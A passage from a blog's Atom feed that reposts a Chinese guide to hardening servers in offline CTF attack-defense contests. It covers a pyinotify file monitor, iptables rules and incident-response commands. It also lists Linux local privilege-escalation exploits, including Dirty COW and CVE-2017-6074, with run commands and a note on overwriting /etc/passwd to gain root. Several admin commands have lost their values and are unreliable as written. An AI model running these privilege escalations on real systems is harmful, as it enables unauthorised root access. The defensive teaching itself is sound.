title="6.HG泄露"></a>6.HG泄露</h3><p><img src="https://img-blog.csdnimg.cn/9ce4a77efa864d8e9a5ab6f8585197a8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/c146fbd4f5ea46728c11833c77029921.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/d052cd071923494b9643405a7197b8ff.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/c6ad340ad9f140b98a45fbbfe1868167.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/4f0d2cdea28e4aeab203240510ad90ee.png" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF中的信息泄露&quot;&gt;&lt;a href=&quot;#CTF中的信息泄露&quot; class=&quot;headerlink&quot; title=&quot;CTF中的信息泄露&quot;&gt;&lt;/a&gt;CTF中的信息泄露&lt;/h1&gt;&lt;p&gt;一般先用dirmap扫一下，看下有没有信息泄露，CTF中不太建议用御剑的那些字典，很</summary>
      
    
    
    
    <category term="信息泄露" scheme="https://lhhxs.github.io/categories/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="信息泄露" scheme="https://lhhxs.github.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>CTF线下防御战 — 让你的靶机变成“铜墙铁壁”</title>
    <link href="https://lhhxs.github.io/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8B%E9%98%B2%E5%BE%A1%E6%88%98%20%E2%80%94%20%E8%AE%A9%E4%BD%A0%E7%9A%84%E9%9D%B6%E6%9C%BA%E5%8F%98%E6%88%90%E2%80%9C%E9%93%9C%E5%A2%99%E9%93%81%E5%A3%81%E2%80%9D/"/>
    <id>https://lhhxs.github.io/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8B%E9%98%B2%E5%BE%A1%E6%88%98%20%E2%80%94%20%E8%AE%A9%E4%BD%A0%E7%9A%84%E9%9D%B6%E6%9C%BA%E5%8F%98%E6%88%90%E2%80%9C%E9%93%9C%E5%A2%99%E9%93%81%E5%A3%81%E2%80%9D/</id>
    <published>2022-09-09T02:08:24.523Z</published>
    <updated>2022-09-09T14:24:03.260Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF线下防御战-—-让你的靶机变成“铜墙铁壁”"><a href="#CTF线下防御战-—-让你的靶机变成“铜墙铁壁”" class="headerlink" title="CTF线下防御战 — 让你的靶机变成“铜墙铁壁”"></a>CTF线下防御战 — 让你的靶机变成“铜墙铁壁”</h1><p>发布于2018-08-03 10:46:24阅读 9850</p><blockquote><p>这篇文章特别不错，要是在安恒杯比赛之前就看了就不会被打的太惨了。</p></blockquote><hr><p><strong>一. 前言</strong></p><p>随着<a href="https://geekmubai.com/tag/ctf">CTF</a>的普及，比赛的形式也有了越来越多的花样，对于<a href="https://geekmubai.com/tag/%e7%ba%bf%e4%b8%8b%e8%b5%9b">线下赛</a>来说，开始出现了安全加固或者<a href="https://geekmubai.com/tag/%e9%98%b2%e5%be%a1">防御</a>战之类的环节，亦或者因为拿下靶机后不希望其他攻击者进入而进行“争夺”，无论什么形式，这些都需要我们对于服务器的防护工作有所了解。对于<a href="https://geekmubai.com/tag/%e7%ba%bf%e4%b8%8b%e8%b5%9b">线下赛</a>，笔者虽说没有什么很高超的攻防技巧，但也是有着一些自己的心得。本文总结了一些<a href="https://geekmubai.com/tag/ctf">CTF</a><a href="https://geekmubai.com/tag/%e7%ba%bf%e4%b8%8b%e8%b5%9b">线下赛</a>中常用的服务器加固姿势，希望能对各位<a href="https://geekmubai.com/tag/ctf">CTF</a>朋友们有所帮助。环境针对目前常见<a href="https://geekmubai.com/tag/%e7%ba%bf%e4%b8%8b%e8%b5%9b">线下赛</a>常见的linux Web服务器，但是因为<a href="https://geekmubai.com/tag/ctf">CTF</a>毕竟与真实网络环境有很大区别，本文的涉及的大部分姿势不具有普遍适用性。本文涉及到的相关代码github下载地址：<a href="https://github.com/ssooking/CTFDefense">CTFDefense</a>。</p><p><strong>二. 常用姿势</strong></p><p><strong>1. 提权</strong></p><p>在开始正文之前，需要先提一下提权，这个要根据自己的比赛过程中的需要而定。有些比赛就有专门的<a href="https://geekmubai.com/tag/%e9%98%b2%e5%be%a1">防御</a>加固环节，但安全加固的很多操作都会涉及到root权限，如果直接给root权限最好，但一般一开始会给一个普通权限账号，或者干脆什么都不给，需要我们自己通过漏洞拿下服务器，这样往往就需要提权了。关于提权，通常我们要根据kernel版本号找到对应的poc，平时我们可以收集测试一些比较新的提权poc，以备不时之需。这里有一个网站：<a href="http://exploit.linuxnote.org/">http://exploit.linuxnote.org/</a>，里面有许多linux本地提权的poc。github上有一个挺全的提权exp项目：<a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a> 。网上也有人分享的一些打包搜集的poc,比如<a href="https://bbs.77169.com/forum.php?mod=viewthread&tid=363466">这个</a>，有兴趣的朋友可以多下载看看。</p><p>下面分享几个最近两年并且影响范围比较大的：</p><p><a href="https://github.com/torvalds/linux/commit/5edabca9d4cff7f1f2b68f0bac55ef99d9798ba4">CVE-2017-6074 (DCCP双重释放漏洞 &gt; 2.6.18 ）</a></p><p>描述：DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务（系统崩溃）或者提升权限，获得系统的管理访问权限</p><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pwn </span><br></pre></td></tr></table></figure><p>复制</p><p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">CVE-2016-5195（脏牛，kernel 2.6.22 &lt; 3.9 (x86&#x2F;x64)）</a></p><p>描述：低权限用户可修改root用户创建的文件内容，如修改 &#x2F;etc&#x2F;passwd，把当前用户的 uid 改成 0 即可提升为root权限</p><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dirtyc0w file content </span><br></pre></td></tr></table></figure><p>复制</p><p><a href="https://github.com/torvalds/linux/commit/f6fb8f100b807378fda19e83e5ac6828b638603a">CVE-2016-8655（Ubuntu 12.04、14.04，Debian 7、8）</a></p><p>描述：条件竞争漏洞，可以让低权限的进程获得内核代码执行权限</p><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chocobo_root </span><br></pre></td></tr></table></figure><p>复制</p><p>POC： <a href="https://www.seebug.org/vuldb/ssvid-92567">https://www.seebug.org/vuldb/ssvid-92567</a></p><p><a href="https://github.com/c0d3z3r0/sudo-CVE-2017-1000367">CVE-2017-1000367（sudo本地提权漏洞 ）</a></p><p>CVE-2017-1000364</p><p>描述：Linux Kernel Stack Clash安全漏洞。该漏洞是由于操作系统内存管理中的一个堆栈冲突漏洞，它影响Linux，FreeBSD和OpenBSD，NetBSD，Solaris，i386和AMD64，攻击者可以利用它破坏内存并执行任意代码 。</p><p><a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html">CVE-2016-1247（Nginx权限提升漏洞）</a></p><p>描述：Nginx服务在创建log目录时使用了不安全的权限设置，可造成本地权限提升，恶意攻击者能够借此实现从 nginx&#x2F;web 的用户权限 www-data 到 root 用户权限的提升。</p><p>POC：<a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html">https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a></p><p>提权相关代码在GetRoot目录，POC中是上面提到的几个本地提权源代码，release中分别是编译好的32位和64位程序。</p><p>实用脚本</p><p><a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester.git">Linux_Exploit_Suggester.pl</a> ，它可以根据系统内核版本号返回一个包含了可能exploits的列表。还有一个检查linux安全状况的脚本：<a href="http://www.freebuf.com/sectool/108564.html">原文链接</a></p><p>还有几个详见：<a href="http://www.freebuf.com/sectool/121847.html">Linux提权？这四个脚本可以帮助你</a></p><p><strong>2. 常用操作命令</strong></p><p>linux操作有很多命令，但是线下赛的防护工作中常用的也就那么一些，我们平时可以留意并总结起来，便于我们比赛使用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">ssh &lt;-p 端口&gt; 用户名@IP　　</span><br><span class="line">scp 文件路径  用户名@IP:存放路径　　　　</span><br><span class="line">tar -zcvf web.tar.gz /var/www/html/　　</span><br><span class="line">w 　　　　</span><br><span class="line">pkill -<span class="built_in">kill</span> -t &lt;用户<span class="built_in">tty</span>&gt;　　 　　</span><br><span class="line">ps aux | grep pid或者进程名　　　　</span><br><span class="line"><span class="comment">#查看已建立的网络连接及进程</span></span><br><span class="line">netstat -antulp | grep EST</span><br><span class="line"><span class="comment">#查看指定端口被哪个进程占用</span></span><br><span class="line">lsof -i:端口号 或者 netstat -tunlp|grep 端口号</span><br><span class="line"><span class="comment">#结束进程命令</span></span><br><span class="line"><span class="built_in">kill</span> PID</span><br><span class="line">killall &lt;进程名&gt;　　</span><br><span class="line"><span class="built_in">kill</span> - &lt;PID&gt;　　</span><br><span class="line"><span class="comment">#封杀某个IP或者ip段，如：.　　</span></span><br><span class="line">iptables -I INPUT -s . -j DROP</span><br><span class="line">iptables -I INPUT -s ./ -j DROP</span><br><span class="line"><span class="comment">#禁止从某个主机ssh远程访问登陆到本机，如123..　　</span></span><br><span class="line">iptable -t filter -A INPUT -s . -p tcp --dport  -j DROP　　</span><br><span class="line"><span class="comment">#备份mysql数据库</span></span><br><span class="line">mysqldump -u 用户名 -p 密码 数据库名 &gt; back.sql　　　　</span><br><span class="line">mysqldump --all-databases &gt; bak.sql　　　　　　</span><br><span class="line"><span class="comment">#还原mysql数据库</span></span><br><span class="line">mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql　　</span><br><span class="line">find / *.php -perm  　　 　　</span><br><span class="line">awk -F:  /etc/passwd　　　　</span><br><span class="line">crontab -l　　　　</span><br><span class="line"><span class="comment">#检测所有的tcp连接数量及状态</span></span><br><span class="line">netstat -ant|awk  |grep |sed -e  -e |<span class="built_in">sort</span>|<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -rn</span><br><span class="line"><span class="comment">#查看页面访问排名前十的IP</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/access.log | <span class="built_in">cut</span> -f1 -d   | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -k  -r | <span class="built_in">head</span> -　　</span><br><span class="line"><span class="comment">#查看页面访问排名前十的URL</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/access.log | <span class="built_in">cut</span> -f4 -d   | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -k  -r | <span class="built_in">head</span> - </span><br></pre></td></tr></table></figure><p>复制</p><p>再推荐两篇篇安全应急排查手册：<a href="https://yq.aliyun.com/articles/177337">应急排查手册</a> ，<a href="https://xianzhi.aliyun.com/forum/mobile/read/2150.html">Linux应急响应姿势浅谈</a></p><p><strong>3. 文件监控防webshell</strong></p><p><a href="https://geekmubai.com/tag/%e9%98%b2%e5%be%a1">防御</a>webshell，我们可以监控我们的web目录，对文件的增加或修改等操作进行限制等，粗暴一点的话，就禁止任何文件产生变化，杜绝被传webshell的可能性。</p><p><strong>（1）使用系统 chattr +i 命令</strong></p><p>linux下的文件有着隐藏属性，可以用lsattr命令查看。其中有一个i属性，表示不得更动任意文件或目录。如果你已经有root或者sudo权限了，那么你可以使用”chattr +i 命令”修改文件隐藏属性，这样所有用户都不能对该文件或者目录进行修改删除等操作（包括root），如果想进行修改，必须用命令”chattr -i”取消隐藏属性。</p><p><a href="http://www.runoob.com/linux/linux-comm-chattr.html">Linux文件保护禁止修改、删除、移动文件等,使用chattr +i保护</a></p><p>例子：</p><p>用chattr命令防止系统中某个关键文件被修改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr +i /etc/profile </span><br></pre></td></tr></table></figure><p>复制</p><p>将&#x2F;var&#x2F;www&#x2F;html目录下的文件设置为不允许任何人修改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr -R +i /var/www/html </span><br></pre></td></tr></table></figure><p>复制</p><p><strong>（2）自己动手丰衣足食</strong></p><p>python的第三方库pyinotify可以让我们很方便地实现这些功能。但是由于是第三方库，<strong>线下赛中通常没法联网安装库</strong>，所以我们可以手工把库文件传到靶机里python库中: &#x2F;usr&#x2F;lib&#x2F;pythonXXX&#x2F;site-packages，但是更方便的做法是借用pyinstaller等工具将其打包成linux可执行文件。</p><p>安装了pyinotify库之后，我们仅仅运行在机器上： “python -m pyinotify 监控目录路径” 这条简单的命令，就可以看到对这个目录以及该目录下所有进行任何操作的的监控日志。</p><p>但由于监控事件太过杂，很多并不是我们关注的，并且我们不仅仅要监控，还需要对某些操作进行自动处理，因此我们可以自己编程，针对性地实现我们需要的功能，下面是一段代码示例。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># ** Author: ssooking</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> pyinotify <span class="keyword">import</span> WatchManager, Notifier,ProcessEvent</span><br><span class="line"><span class="keyword">from</span> pyinotify <span class="keyword">import</span> IN_DELETE, IN_CREATE,IN_MOVED_TO,IN_ATTRIB</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EventHandler</span>(<span class="title class_ inherited__">ProcessEvent</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;事件处理&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#创建</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">process_IN_CREATE</span>(<span class="params">self, event</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;[!] Create : &quot;</span> + event.pathname</span><br><span class="line">            DeleteFileOrDir(event.pathname)</span><br><span class="line">        <span class="comment">#删除</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">process_IN_DELETE</span>(<span class="params">self, event</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;[!] Delete : &quot;</span> + event.pathname</span><br><span class="line">        <span class="comment">#文件属性被修改，如chmod、chown命令</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">process_IN_ATTRIB</span>(<span class="params">self, event</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;[!] Attribute been modified:&quot;</span> + event.pathname</span><br><span class="line">        <span class="comment">#文件被移来，如mv、cp命令</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">process_IN_MOVED_TO</span>(<span class="params">self, event</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;[!] File or dir been moved to here: &quot;</span> + event.pathname</span><br><span class="line">            DeleteFileOrDir(event.pathname)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DeleteFileOrDir</span>(<span class="params">target</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(target):</span><br><span class="line">        fileslist = os.listdir(target)</span><br><span class="line">        <span class="keyword">for</span> files <span class="keyword">in</span> fileslist:</span><br><span class="line">            DeleteFileOrDir(target + <span class="string">&quot;/&quot;</span> + files)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.rmdir(target)</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;     &gt;&gt;&gt; Delete directory successfully: &quot;</span> + target</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;     [-] Delete directory failed: &quot;</span> + target</span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(target):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.remove(target)</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;     &gt;&gt;&gt; Delete file successfully&quot;</span> + target</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;     [-] Delete file filed:  &quot;</span> + target</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Monitor</span>(<span class="params">path</span>):</span><br><span class="line">        wm = WatchManager()</span><br><span class="line">        mask = IN_DELETE | IN_CREATE | IN_MOVED_TO | IN_ATTRIB</span><br><span class="line">        notifier = Notifier(wm, EventHandler())</span><br><span class="line">        wm.add_watch(path, mask,rec=<span class="literal">True</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[+] Now Starting Monitor:  %s&#x27;</span>%(path)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                        notifier.process_events()</span><br><span class="line">                        <span class="keyword">if</span> notifier.check_events():</span><br><span class="line">                                notifier.read_events()</span><br><span class="line">                <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                        notifier.stop()</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        usage=<span class="string">&quot;%(prog)s -w [path]&quot;</span>,</span><br><span class="line">        description=(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            Introduce：Simple Directory Monitor!  by ssooking&#x27;&#x27;&#x27;</span>)</span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-w&#x27;</span>,<span class="string">&#x27;--watch&#x27;</span>,action=<span class="string">&quot;store&quot;</span>,dest=<span class="string">&quot;path&quot;</span>,default=<span class="string">&quot;/var/www/html/&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;directory to watch,default is /var/www/html&quot;</span>)</span><br><span class="line">    args=parser.parse_args()</span><br><span class="line">    Monitor(args.path) </span><br></pre></td></tr></table></figure><p>复制</p><p>关于pyinotify 库的用法不再赘述，可以看到我在上述代码中创建了一个事件监控处理的类EventHandler，在这个示例中，我们仅仅关注创建、删除、修改属性、移动操作事件，并且我定义了一个DeleteFileOrDir方法用于自动删除增加的目录或者文件。运行测试截图：</p><p>我们可以编写功能更加细化的程序，实现如：</p><p>监控文件变更，</p><p>禁止创建、修改、删除任何文件或目录，</p><p>自动删除新增文件，</p><p>把被修改的文件改回去,</p><p>删除畸形隐藏文件等功能。我们使用pyinstaller把我代码打包为linux的elf可执行文件。-F参数表示打包为独立可运行文件，命令执行完之后自动生成：build、dist文件夹和SimpleMonitor.spec文件，你可以在dist目录里找到生成的elf程序。</p><p>打包的文件在CTFDefense项目的Monitor目录下</p><p><strong>4. 网络监控断异常连接</strong></p><p>linux安全防护一定少不了 iptables了，使用iptables需要有管理员权限。对于比赛环境，我们完全可以配置一个近乎苛刻的配置防火墙策略。</p><p>具体我们可以做哪些工作呢，举一些例子：</p><p><strong>（1）关闭所有网络端口，只开放一些比赛的必要端口，也可以防止后门的连接</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开放ssh</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</span><br><span class="line"><span class="comment">#打开80端口</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</span><br><span class="line"><span class="comment">#开启多端口简单用法</span></span><br><span class="line">iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT</span><br><span class="line"><span class="comment">#允许外部访问本地多个端口 如8080，8081，8082,且只允许是新连接、已经连接的和已经连接的延伸出新连接的会话</span></span><br><span class="line">iptables -A INPUT -p tcp -m multiport --dport 8080,8081,8082,12345 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp -m multiport --sport 8080,8081,8082,12345 -m state --state ESTABLISHED -j ACCEPT </span><br></pre></td></tr></table></figure><p>复制</p><p><strong>（2）限制ssh登陆，进行访问控制</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptable -t filter -A INPUT -s 123.4.5.6 -p tcp --dport 22 -j DROP 　　//禁止从123.4.5.6远程登陆到本机</span><br><span class="line">iptables -A INPUT -s 123.4.5.6/24 -p tcp --dport 22 -j ACCEPT　　//允许123.4.5.6网段远程登陆访问ssh </span><br></pre></td></tr></table></figure><p>复制</p><p><strong>（3）限制IP连接数和连接速率</strong></p><p>我们可以限制IP的网络连接数和速度等，限制过快的连接频率，这样可以在一定程度上限制对方的扫描器。狠一点的话，甚至可以让对方只能以手工点网页的速度与访问+_+</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#单个IP的最大连接数为 30</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT</span><br><span class="line"><span class="comment">#单个IP在60秒内只允许最多新建15个连接</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECT</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --<span class="built_in">set</span> -j ACCEPT</span><br><span class="line"><span class="comment">#允许外部访问本机80端口，且本机初始只允许有10个连接，每秒新增加2个连接，如果访问超过此限制则拒接 （此方式可以限制一些攻击）</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 2/s --limit-burst 10 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT </span><br></pre></td></tr></table></figure><p>复制</p><p>再猥琐一点，可以定时断开已经建立的连接，让对方只能断断续续的访问</p><p><strong>（4）数据包简单识别，防止端口复用类的后门或者shell</strong></p><p>假设病毒木马程序通过22，80端口向服务器外传送数据，这种方式发向外发的数据不是我们通过访问网页请求而回应的数据包。我们可以禁止这些没有通过请求回应的数据包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEP </span><br></pre></td></tr></table></figure><p>复制</p><p><strong>（5）限制访问</strong></p><p>如果对方来势太凶，我们可以限制或者封杀他们的ip段。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptable -t filter -A FORWARD -s 123.4.5.6 -d 123.4.5.7 -j DROP　　//禁止从客户机123.4.5.6访问123.4.5.7上的任何服务</span><br><span class="line"><span class="comment">#封杀123.4.5.6这个IP或者某个ip段</span></span><br><span class="line">iptables -I INPUT -s 123.4.5.6 -j DROP</span><br><span class="line">iptables -I INPUT -s 123.4.5.1/24 -j DROP </span><br></pre></td></tr></table></figure><p>复制</p><p><strong>（6）过滤异常报文</strong></p><p>iptables有一个TCP匹配扩展协议–tcp-flags，功能是过滤TCP中的一些包，比如SYN包，ACK包，FIN包，RST包等等。举个例子，我们知道SYN是建立连接，RST是重置连接，如果这两个同时出现，就知道这样的包是有问题的，应该丢弃。下面的例子是利用–tcp-flags参数，对一些包进行标识过滤，扔掉异常的数据包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,FIN,ACK,RST SYN 　　　　　　　　<span class="comment">#表示 SYN,FIN,ACK,RST的标识都检查，但只匹配SYN标识</span></span><br><span class="line">iptables -A INPUT -p tcp --syn 　　　　　　　　　　　　　　　　　　　　　　　 <span class="comment">#匹配SYN标识位</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP 　　　　　 <span class="comment">#检查所有的标识位，匹配到FIN URG PSH的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP 　　　　　　　　　 <span class="comment">#丢弃没标志位的包</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP　<span class="comment">#匹配到SYN ACK FIN URG的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST -j DROP　　　　　　<span class="comment">#匹配到SYN ACK FIN RST的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,PSH -j DROP　　　　　　<span class="comment">#匹配到SYN FIN PSH的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST,PSH -j DROP　 　　<span class="comment">#匹配到SYN FIN RST PSH的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP　　　　　　<span class="comment">#匹配到 SYN,RST的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP 　　　　　 <span class="comment">#匹配到 SYN,FIN的丢弃 </span></span><br></pre></td></tr></table></figure><p>复制</p><p><strong>（7）防DDOS攻击</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 